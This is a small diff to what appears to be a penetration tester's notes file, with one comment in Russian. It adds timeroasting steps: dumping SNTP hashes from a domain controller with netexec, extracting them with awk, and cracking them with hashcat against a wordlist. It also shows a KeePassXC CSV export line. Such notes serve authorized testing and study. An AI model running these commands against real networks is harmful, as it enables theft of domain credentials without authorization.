@@ -53,9 +53,11 @@ keepassxc.cli export --format csv Database.kdbx
 
 
 timeroasting 
-
+nxc smb DC_ip -M timeroast 
+вставляем  реузльтат команды в  hashes.txt
+cat hashes.txt | awk '{print $5}' >  timeroast_hashes.txt    
 hashcat -m 31300 -a 0 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule  --username
-
+hashcat -m 31300 -a 0 timeroast_hashes.txt  --username --show 
 
 
 
